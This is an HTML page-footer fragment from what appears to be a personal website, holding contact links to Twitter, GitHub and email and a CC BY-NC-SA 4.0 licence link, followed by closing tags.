    <span>Contact me on <a class=link href=https://twitter.com/merkleplant_eth>twitter</a>,
<a class=link href=https://github.com/pmerkleplant>github</a>, or via
<a class=link href="mailto:me@merkleplant.xyz">email</a> |
<a class=link href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh target=_blank rel=noopener>CC BY-NC-SA 4.0</a>
</span>
  </div>
</footer>

  </div>

  
  

  
  

  
  

</body>

</html>
